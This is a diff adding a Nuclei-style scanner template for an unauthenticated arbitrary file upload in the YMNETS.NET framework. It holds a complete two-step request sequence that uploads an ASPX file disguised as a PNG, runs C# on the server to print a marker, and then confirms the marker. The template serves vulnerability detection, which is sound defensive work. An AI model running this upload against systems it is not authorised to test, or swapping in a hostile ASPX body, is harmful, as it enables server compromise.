@@ -1,0 +1,67 @@
+id: ymnets-upload-any-file
+
+info:
+  name: YMNETS.NET Framework Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    YMNETS.NET development framework uses ASP.NET MVC5. It has an unauthorized interface that allows attackers to upload files, potentially leading to sensitive information disclosure or server access.
+  tags: file-upload
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: file-upload-check
+    method: POST
+    path:
+      - "{{BaseURL}}/SysHelper/Upload"
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36"
+      Accept-Encoding: "gzip, deflate"
+      Accept: "*/*"
+      Connection: "close"
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundaryu178FOm4XGgDZqeX"
+    body: |
+      ------WebKitFormBoundaryu178FOm4XGgDZqeX
+      Content-Disposition: form-data; name="Filedata"; filename="2.aspx"
+      Content-Type: image/png
+
+      <%@Page Language="C#"%>
+      <%
+      Response.Write(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("ZTE2NTQyMTExMGJhMDMwOTlhMWMwMzkzMzczYzViNDM=")));
+      System.IO.File.Delete(Request.PhysicalPath);
+      %>
+      ------WebKitFormBoundaryu178FOm4XGgDZqeX--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "FilePath"
+    extractors:
+      - type: regex
+        name: pocfile
+        internal: true
+        regex:
+          - "FilePath\":\"(.*?)\""
+
+  - id: file-access-check
+    method: GET
+    path:
+      - "{{BaseURL}}/{{pocfile}}"
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36"
+      Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "e165421110ba03099a1c0393373c5b43"
